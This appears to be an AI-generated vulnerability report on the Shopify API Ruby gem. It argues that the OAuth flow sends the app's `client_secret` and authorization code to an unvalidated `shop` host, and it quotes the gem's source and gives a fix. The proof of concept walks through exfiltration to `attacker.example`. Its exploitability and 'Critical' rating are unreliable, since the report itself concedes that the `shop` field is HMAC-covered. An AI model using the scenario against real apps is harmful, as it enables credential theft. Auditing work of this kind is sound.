Based on my investigation, `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` build the OAuth authorization URL and the access-token exchange URL directly from the caller-supplied `shop` string, without ever invoking `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain`.

### Title
OAuth flow sends `client_secret` and authorization `code` to an unvalidated `shop` host - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`Oauth.begin_auth` and `Oauth.validate_auth_callback` derive the Shopify host to talk to (`auth_base_uri(shop)`) directly from the `shop` value passed by the caller, and never call `ShopValidator.sanitize!`/`sanitize_shop_domain` to confirm that host belongs to a trusted `*.myshopify.com`/`myshopify.io`/`spin.dev`/`shop.dev` domain.

### Finding Description
`Oauth.begin_auth` builds the authorize URL as `auth_base_uri(shop) + "/oauth/authorize?..."` [1](#0-0) , and `auth_base_uri` simply does `"https://#{shop}/admin"` with no domain restriction [2](#0-1) .

More importantly, `validate_auth_callback` takes `auth_query.shop` (a field that is HMAC-covered as *content* but never checked to be a Shopify domain) and uses it to build the `null_session` for the token-exchange HTTP client: `Auth::Session.new(shop: auth_query.shop)`, then issues a `POST /admin/oauth/access_token` request carrying `client_id`, `client_secret`, and `code` through `Clients::HttpClient.new(session: null_session, ...)` [3](#0-2) . The HMAC only proves the `shop` string wasn't tampered with in transit from whoever produced the signature; it does not prove the `shop` string is an actual Shopify-owned domain. Nothing in this path calls `Utils::ShopValidator.sanitize!(auth_query.shop)` before the value is turned into a request host that receives `Context.api_secret_key` and the authorization `code`.

This exactly matches the requested analog class: "a host validated (here: not validated at all) versus the host that receives the access token or `client_secret`." The binding that should hold is:
`host(shop) ∈ TRUSTED_SHOPIFY_DOMAINS` **before** `client_secret` and `code` are sent to `https://{shop}/admin/oauth/access_token`.
Currently the equality/verification never happens — the gem trusts the `HttpClient`'s base path (built from `shop`) implicitly, while `ShopValidator` — the component designed precisely to enforce this binding — exists elsewhere in the codebase [4](#0-3)  but is wired into other flows (`token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`, `graphql/storefront.rb`) — not into `oauth.rb`.

### Impact Explanation
If a caller (e.g., an app's OAuth controller) passes through an attacker-influenced `shop` value from the query string without separately validating it via `ShopValidator` — something the gem itself does not enforce for this flow, unlike for `token_exchange`/`refresh_token`/`client_credentials` — the gem will POST the app's `client_secret` together with the OAuth authorization `code` to an attacker-controlled host of the form `https://{attacker-domain}/admin/oauth/access_token`. That directly leaks the app's `client_secret` and lets the attacker capture and replay the authorization `code`, i.e., a credential-exfiltration / cross-tenant path matching the Critical impact bucket ("theft or exfiltration of ... the app's `client_secret`").

### Likelihood Explanation
This is exploitable purely from the unprivileged-internet-user side: an attacker only needs to get their target app's OAuth callback invoked with a crafted `shop` parameter (e.g. via a manipulated install link) that is not itself validated by the host application before being handed to `Oauth.begin_auth`/`validate_auth_callback`. Because the gem — unlike its sibling `token_exchange.rb`/`refresh_token.rb`/`client_credentials.rb` modules — performs no internal `ShopValidator` check on `shop` for this specific flow, protection depends entirely on the integrating app doing it correctly, which is not guaranteed and is inconsistent with the rest of the library's own defenses.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) at the start of both `begin_auth` and `validate_auth_callback` (on `auth_query.shop`), raising `Errors::InvalidShopError` for any shop that is not on `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, before that value is used to construct `auth_base_uri`/`Session`/`HttpClient` base paths, exactly as is already done in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`.

### Proof of Concept
1. An app's controller receives an OAuth install/callback request where the `shop` param is attacker-supplied and forwards it unchecked into `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], ...)` or into `AuthQuery.new(shop: params[:shop], ...)` → `Oauth.validate_auth_callback(auth_query:)`.
2. Because `oauth.rb` never calls `ShopValidator.sanitize!`, `auth_base_uri(shop)` resolves to `https://attacker.example/admin`.
3. On callback, `validate_auth_callback` builds `Auth::Session.new(shop: "attacker.example")` and issues `client.request(... path: "access_token", body: { client_id, client_secret: Context.api_secret_key, code, expiring })` against `https://attacker.example/admin/oauth/access_token`, sending the app's `client_secret` and the authorization `code` to the attacker's server [5](#0-4) .

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
